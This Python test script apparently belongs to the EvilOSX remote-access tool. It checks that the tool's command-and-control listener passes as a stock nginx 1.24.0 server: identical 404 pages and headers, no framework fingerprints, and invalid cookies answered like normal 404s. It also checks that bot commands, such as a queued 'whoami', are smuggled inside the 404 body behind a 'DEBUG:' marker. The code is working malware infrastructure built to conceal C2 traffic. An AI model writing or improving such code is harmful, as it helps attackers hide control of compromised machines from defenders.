#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Conformance test: the C2 listener must answer like a stock nginx.

Three layers of verification, strongest first:

1. ``--reference HOST:PORT`` - compares against a *real* nginx instance.
   Body bytes and every header except ``Date`` must match exactly.
2. ``--golden FILE`` / built-in golden - compares against a captured stock
   nginx 1.24.0 response stored as raw HTTP bytes.
3. Self-consistency - the hidden command channel still works and does not
   alter the status line, header set, header order, or any header value
   except ``Content-Length`` (which necessarily grows by the blob size).

Usage
-----
    python tools/test_nginx_facade.py                          # golden only
    python tools/test_nginx_facade.py --port 1337               # live server
    python tools/test_nginx_facade.py --reference 127.0.0.1:8080 --port 1337

Exit code 0 = every check passed.
"""

from __future__ import annotations

import argparse
import base64
import json
import socket
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

from server import nginx_facade  # noqa: E402


# --------------------------------------------------------------------------- #
# Golden capture: what `curl -i http://nginx.example/anything` returns from a
# stock `nginx/1.24.0` with an empty docroot (no location matched).
# --------------------------------------------------------------------------- #

GOLDEN_404_BODY = (
    b"<html>\r\n"
    b"<head><title>404 Not Found</title></head>\r\n"
    b"<body>\r\n"
    b"<center><h1>404 Not Found</h1></center>\r\n"
    b"<hr><center>nginx/1.24.0</center>\r\n"
    b"</body>\r\n"
    b"</html>\r\n"
)

# Header names in the exact order nginx emits them, and their expected values.
GOLDEN_HEADER_ORDER = ["Server", "Date", "Content-Type", "Content-Length"]
GOLDEN_HEADER_VALUES = {
    "Server": "nginx/1.24.0",
    "Content-Type": "text/html",
    "Content-Length": str(len(GOLDEN_404_BODY)),
}


def raw_request(host: str, port: int, path: str = "/", method: str = "GET",
                headers: dict | None = None, extra_raw: bytes = b"",
                timeout: float = 5.0) -> bytes:
    """Send a raw HTTP/1.1 request and return the raw response bytes."""
    lines = ["{} {} HTTP/1.1".format(method, path), "Host: {}".format(host)]
    for name, value in (headers or {}).items():
        lines.append("{}: {}".format(name, value))
    payload = ("\r\n".join(lines) + "\r\n\r\n").encode("latin-1") + extra_raw

    with socket.create_connection((host, port), timeout=timeout) as sock:
        sock.sendall(payload)
        chunks = []
        while True:
            try:
                chunk = sock.recv(65536)
            except socket.timeout:
                break
            if not chunk:
                break
            chunks.append(chunk)
            # Basic Content-Length framing so we stop as soon as the body is in.
            blob = b"".join(chunks)
            if b"\r\n\r\n" in blob:
                head, _, body = blob.partition(b"\r\n\r\n")
                for line in head.split(b"\r\n"):
                    if line.lower().startswith(b"content-length:"):
                        if len(body) >= int(line.split(b":")[1]):
                            return blob
                        break
        return b"".join(chunks)


def parse_response(raw: bytes) -> dict:
    """Split a raw HTTP response into status, ordered headers and body."""
    head, _, body = raw.partition(b"\r\n\r\n")
    lines = head.split(b"\r\n")
    status = lines[0].decode("latin-1")
    headers = []
    for line in lines[1:]:
        if not line:
            continue
        name, _, value = line.partition(b":")
        headers.append((name.decode("latin-1"), value.decode("latin-1").strip()))
    return {"status": status, "headers": headers, "body": body,
            "header_map": {k: v for k, v in headers},
            "header_names": [k for k, _ in headers]}


class Checker:
    def __init__(self):
        self.passed = 0
        self.failed = []

    def check(self, label: str, ok: bool, detail: str = "") -> bool:
        if ok:
            self.passed += 1
            print("  [PASS] {}".format(label))
        else:
            self.failed.append(label)
            print("  [FAIL] {}".format(label))
            if detail:
                for line in detail.splitlines():
                    print("         {}".format(line))
        return ok

    def eq(self, label: str, actual, expected) -> bool:
        return self.check(label, actual == expected,
                          "actual:   {!r}\nexpected: {!r}".format(actual, expected))

    def summary(self) -> int:
        print()
        print("{} passed, {} failed".format(self.passed, len(self.failed)))
        for name in self.failed:
            print("  failed: {}".format(name))
        return 0 if not self.failed else 1


def check_body_and_headers(c: Checker, resp: dict, reference: dict | None,
                           label: str) -> None:
    """Compare a parsed *pristine* 404 response against the reference."""
    ref = reference or {
        "status": "HTTP/1.1 404 Not Found",
        "headers": [("Server", "nginx/1.24.0"),
                    ("Date", "Thu, 01 Jan 2026 00:00:00 GMT"),
                    ("Content-Type", "text/html"),
                    ("Content-Length", str(len(GOLDEN_404_BODY))),
                    ("Connection", "keep-alive")],
        "body": GOLDEN_404_BODY,
    }

    c.eq("{}: status line".format(label), resp["status"], ref["status"])
    c.eq("{}: body bytes".format(label), resp["body"], ref["body"])
    c.eq("{}: header order".format(label), resp["header_names"],
         [k for k, _ in ref["headers"]])

    for name, value in ref["headers"]:
        actual = resp["header_map"].get(name)
        if name.lower() == "date":
            # Date necessarily differs between two captures; check the format.
            ok = (actual is not None and len(actual) == 29
                  and actual[3:5] == ", " and actual.endswith(" GMT"))
            c.check("{}: Date present and IMF-fixdate".format(label), ok,
                    "actual: {!r}".format(actual))
        else:
            c.eq("{}: {} header".format(label, name), actual, value)


def check_no_leaks(c: Checker, resp: dict, label: str) -> None:
    """No aiohttp/Python fingerprints may survive anywhere in the response."""
    blob = (json.dumps(resp["header_map"]) + resp["body"].decode("latin-1", "replace"))
    for needle in ("aiohttp", "Python/", "python/"):
        c.check("{}: no {!r} fingerprint".format(label, needle),
                needle not in blob, "response mentions {!r}".format(needle))


def check_command_channel(c: Checker, resp: dict, command: str, label: str) -> None:
    """The hidden blob must be extractable exactly as bot/bot.py does it."""
    body = resp["body"]
    marker = b"DEBUG:"
    if marker not in body:
        c.check("{}: command channel present".format(label), False,
                "no DEBUG: marker in body")
        return
    processed = body.split(marker, 1)[1]
    if processed.startswith(b"\r\n"):
        processed = processed[2:]
    elif processed.startswith(b"\n"):
        processed = processed[1:]
    processed = processed.replace(b"DEBUG-->", b"").strip()
    c.eq("{}: bot extracts the command".format(label), processed.decode(),
         command)

    # Everything the bot ignores must still look like stock nginx.
    c.eq("{}: body still starts with stock nginx page".format(label),
         body[:len(GOLDEN_404_BODY)], GOLDEN_404_BODY)
    c.eq("{}: status still 404".format(label), resp["status"],
         "HTTP/1.1 404 Not Found")
    c.eq("{}: Content-Type still text/html".format(label),
         resp["header_map"].get("Content-Type"), "text/html")
    c.eq("{}: Content-Length matches body".format(label),
         resp["header_map"].get("Content-Length"), str(len(body)))


def main() -> int:
    parser = argparse.ArgumentParser(description="nginx facade conformance test")
    parser.add_argument("--reference", help="real nginx HOST:PORT to compare against")
    parser.add_argument("--port", type=int, default=1337,
                        help="port of the EvilOSX listener to test (default 1337)")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--golden", help="file with a captured raw 404 response")
    args = parser.parse_args()

    c = Checker()

    # The page builders (pure functions, no sockets involved).
    print("== builders ==")
    c.eq("NGINX_404_PAGE matches stock page", nginx_facade.NGINX_404_PAGE.encode(),
         GOLDEN_404_BODY)
    c.eq("page length is 153 bytes", len(GOLDEN_404_BODY), 153)
    c.eq("server_tokens off drops the signature line",
         b"<cent</center>" in nginx_facade.nginx_error_page(404, "Not Found", "").encode()
         .replace(b"<center><h1>404 Not Found</h1></center>", b"<cent</center>"), True)

    # Expected values captured from a real nginx 1.24.0: it always writes a
    # Connection header, and keeps alive on HTTP/1.1 unless told otherwise.
    for version, conn, expected in (("HTTP/1.1", "", "keep-alive"),
                                    ("HTTP/1.1", "close", "close"),
                                    ("HTTP/1.0", "", "close"),
                                    ("HTTP/1.0", "keep-alive", "keep-alive")):
        major, minor = (1, 1) if version == "HTTP/1.1" else (1, 0)
        c.eq("wants_close({}, {!r})".format(version, conn),
             nginx_facade.wants_close(major, minor, conn), expected)

    end_marker = False
    try:
        nginx_facade  # noqa: F841
        sys.path.insert(0, str(ROOT))
        from server.handler import _debug_suffix
        _debug_suffix("abcDEBUG-->def")
    except ValueError:
        end_marker = True
    c.check("payload containing DEBUG--> is rejected", end_marker)

    # The live listener.
    print("\n== live listener {}:{} ==".format(args.host, args.port))
    try:
        raw = raw_request(args.host, args.port, "/")
        resp = parse_response(raw)
    except OSError as ex:
        print("  [SKIP] listener not reachable: {}".format(ex))
        print("         start it with: python start.py --port {}".format(args.port))
        return c.summary()

    reference = None
    if args.reference:
        ref_host, ref_port = args.reference.rsplit(":", 1)
        # Compare a path that cannot exist: "/" may legitimately serve an
        # index file (200 OK), which is not what this facade models.
        reference = parse_response(raw_request(
            ref_host, int(ref_port), "/__conformance_probe__"))
        print("  (reference: real nginx at {}, path /__conformance_probe__)".format(
            args.reference))
    elif args.golden:
        reference = parse_response(Path(args.golden).read_bytes())

    check_body_and_headers(c, resp, reference, "GET / (no cookie)")
    check_no_leaks(c, resp, "GET / (no cookie)")

    # Every unknown path must answer identically.
    for path in ("/favicon.ico", "/index.html", "/a/b/c", "/x?y=z"):
        other = parse_response(raw_request(args.host, args.port, path))
        c.eq("path {}: identical body".format(path), other["body"], resp["body"])
        c.eq("path {}: identical header order".format(path),
             other["header_names"], resp["header_names"])

    # HEAD must not carry a body but must carry the same headers.
    head = parse_response(raw_request(args.host, args.port, "/", method="HEAD"))
    c.eq("HEAD: no body", head["body"], b"")
    c.eq("HEAD: Content-Length preserved",
         head["header_map"].get("Content-Length"),
         resp["header_map"].get("Content-Length"))

    # Connection handling.
    closed = parse_response(raw_request(
        args.host, args.port, "/", headers={"Connection": "close"}))
    c.eq("Connection: close is honoured",
         closed["header_map"].get("Connection"), "close")

    # Bad cookie must not be distinguishable from a plain 404.
    bad = parse_response(raw_request(
        args.host, args.port, "/", headers={"Cookie": "session=not-base64!"}))
    c.eq("bad cookie: same body as stock 404", bad["body"], GOLDEN_404_BODY)

    # Authenticated request: the command channel must still deliver.
    command = base64.b64encode(b"1\nwhoami").decode()
    session = {
        "type": 1,
        "username": "tester",
        "hostname": "test-host",
        "path": "/tmp",
        "version": "10.15",
        "loader_name": "launch_daemon",
    }
    from server.model import RequestType  # noqa: F401  (sanity import)
    session["type"] = 1  # GET_COMMAND
    cookie = "session={}-{}".format(
        # Must be valid UTF-8 after decoding (handler does
        # base64.b64decode(uid_b64).decode()), so keep it 5-byte ASCII-clean.
        base64.b64encode(b"test1").decode(),
        base64.b64encode(json.dumps(session).encode()).decode(),
    )
    try:
        auth = parse_response(raw_request(
            args.host, args.port, "/", headers={"Cookie": cookie}))
        # Second request: the bot is registered by then, so the GET_COMMAND
        # path that reads the command queue actually runs.
        auth2 = parse_response(raw_request(
            args.host, args.port, "/", headers={"Cookie": cookie}))
        print("\n== authenticated request ==")
        c.eq("auth: status still 404", auth["status"], "HTTP/1.1 404 Not Found")
        c.eq("auth: header order unchanged", auth["header_names"],
             resp["header_names"])
        c.check("auth: body starts with stock page",
                auth["body"].startswith(GOLDEN_404_BODY),
                "body: {!r}".format(auth["body"][:200]))
        c.eq("auth (registered bot): status still 404", auth2["status"],
             "HTTP/1.1 404 Not Found")
        c.eq("auth (registered bot): header order unchanged",
             auth2["header_names"], resp["header_names"])
        c.check("auth (registered bot): body starts with stock page",
                auth2["body"].startswith(GOLDEN_404_BODY),
                "body: {!r}".format(auth2["body"][:200]))
        # Queue a command in the server's own DB and confirm it is delivered
        # inside the otherwise-stock 404 body, then consumed.
        from server.model import OptimizedModel
        model = OptimizedModel()
        model.add_command("test1", command)
        model.flush_batches()

        delivered = parse_response(raw_request(
            args.host, args.port, "/", headers={"Cookie": cookie}))
        body = delivered["body"]
        c.eq("delivery: status still 404", delivered["status"],
             "HTTP/1.1 404 Not Found")
        c.check("delivery: body starts with stock nginx page",
                body.startswith(GOLDEN_404_BODY), "body: {!r}".format(body[:200]))
        if b"DEBUG:" in body:
            extracted = body.split(b"DEBUG:", 1)[1]
            extracted = extracted.replace(b"DEBUG-->", b"").strip()
            c.eq("delivery: bot extracts the queued command",
                 extracted.decode(), command)
        else:
            c.check("delivery: command blob present", False,
                    "no DEBUG marker; command was not delivered")
        c.eq("delivery: command consumed exactly once",
             model.get_command_raw("test1"), "")
    except OSError as ex:
        print("  [SKIP] authenticated request: {}".format(ex))

    return c.summary()


if __name__ == "__main__":
    sys.exit(main())
